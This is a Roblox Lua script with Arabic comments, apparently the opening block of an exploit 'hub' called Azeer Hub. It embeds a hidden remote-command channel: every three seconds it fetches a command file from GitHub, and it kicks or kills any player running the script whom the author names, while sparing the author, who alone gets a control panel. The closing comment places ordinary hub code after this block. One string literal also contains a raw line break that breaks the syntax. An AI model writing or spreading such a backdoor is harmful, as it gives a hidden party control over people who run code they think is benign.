local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- اسم حسابك كأدمن وحيد للسكربت
local AdminName = "7avii"

-- ضع هنا رابط الـ Raw لملف الأوامر (سأعلمك كيف تصنعه في الخطوة القادمة)
local CommandUrl = "https://raw.githubusercontent.com/7avii/main.luaa/refs/heads/main/commands.txt"

-------------------------------------------------------------------
-- [1] نظام الاستقبال التلقائي (يفحص الأوامر من GitHub كل 3 ثوانٍ)
-------------------------------------------------------------------
task.spawn(function()
    while task.wait(3) do
        local success, result = pcall(function()
            return game:HttpGet(CommandUrl .. "?t=" .. os.time()) -- الـ os.time تمنع روبلوكس من كاش الرابط وتجلب الأمر فوراً
        end)
        
        if success and result then
            -- تقسيم النص لمعرفة الأمر واللاعب المستهدف
            local data = string.split(result, "|")
            local command = data[1]
            local targetName = data[2]
            
            -- التأكد من أن الأمر موجه للاعب الحالي أو للجميع (all) وأن الأدمن ليس هو المستهدف بالطرد
            if (targetName == LocalPlayer.Name or targetName == "all") and LocalPlayer.Name ~= AdminName then
                
                -- 1. أمر الطرد (Kick)
                if command == "kick" then
                    LocalPlayer:Kick("🚨 [Azeer Hub]: تم طردك بواسطة المطور 7avii")
                    
                -- 2. أمر القتل (Kill)
                elseif command == "kill" then
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid.Health = 0
                    end
                end
            end
        end
    end
end)

-------------------------------------------------------------------
-- [2] واجهة التحكم الرسومية (تظهر لك أنت فقط 7avii)
-------------------------------------------------------------------
if LocalPlayer.Name == AdminName then
    local AdminGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local Title = Instance.new("TextLabel")
    local TargetInput = Instance.new("TextBox")
    local KickBtn = Instance.new("TextButton")
    local KillBtn = Instance.new("TextButton")
    
    AdminGui.Name = "AzeerAdminPanel"
    AdminGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    AdminGui.ResetOnSpawn = false
    
    Frame.Parent = AdminGui
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.Position = UDim2.new(0.05, 0, 0.25, 0)
    Frame.Size = UDim2.new(0, 180, 0, 240)
    Frame.Active = true
    Frame.Draggable = true
    
    Title.Parent = Frame
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Title.Text = "7avii Control Hub"
    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
    Title.TextSize = 15
    Title.Font = Enum.Font.SourceSansBold
    
    -- خانة كتابة اسم اللاعب المستهدف
    TargetInput.Parent = Frame
    TargetInput.Size = UDim2.new(0.9, 0, 0, 40)
    TargetInput.Position = UDim2.new(0.05, 0, 0.22, 0)
    TargetInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    TargetInput.PlaceholderText = "Azeer_BOT
BOT"
    TargetInput.Text = ""
    TargetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    TargetInput.TextSize = 14
    
    local function styleButton(btn, text, pos, color)
        btn.Parent = Frame
        btn.Size = UDim2.new(0.9, 0, 0, 40)
        btn.Position = pos
        btn.BackgroundColor3 = color
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 14
        btn.Font = Enum.Font.SourceSansBold
    end
    
    styleButton(KickBtn, "طرد اللاعب (Kick)", UDim2.new(0.05, 0, 0.45, 0), Color3.fromRGB(150, 0, 0))
    styleButton(KillBtn, "قتل اللاعب (Kill)", UDim2.new(0.05, 0, 0.68, 0), Color3.fromRGB(80, 80, 80))
    
    -- [ملاحظة مهمة]: التعديل التلقائي لملفات جيتهاب من داخل روبلوكس يتطلب Token وهو غير آمن للوضعه في سكربت عام،
    -- لذلك الأزرار ستطبع لك الأمر لتغيره بيدك في ملف commands.txt بـ GitHub بـ ثوانٍ، أو يمكنك كتابة كلمة "all" لتطبيق الأمر على الجميع.
    KickBtn.MouseButton1Click:Connect(function()
        local target = TargetInput.Text ~= "" and TargetInput.Text or "all"
        print("انسخ هذا واكتبه في ملف commands.txt -> :  kick|" .. target)
        -- تنبيه للشاشة
        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "7avii Admin", Text = "اكتب في commands.txt:\nkick|" .. target, Duration = 5})
    end)
    
    KillBtn.MouseButton1Click:Connect(function()
        local target = TargetInput.Text ~= "" and TargetInput.Text or "all"
        print("انسخ هذا واكتبه في ملف commands.txt -> :  kill|" .. target)
        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "7avii Admin", Text = "اكتب في commands.txt:\nkill|" .. target, Duration = 5})
    end)
end

-------------------------------------------------------------------
-- [3] كود واجهة Azeer Hub الأساسية الخاصة بك يكمل هنا بشكل طبيعي:
-------------------------------------------------------------------
print("Azeer Hub Loaded Successfully!")

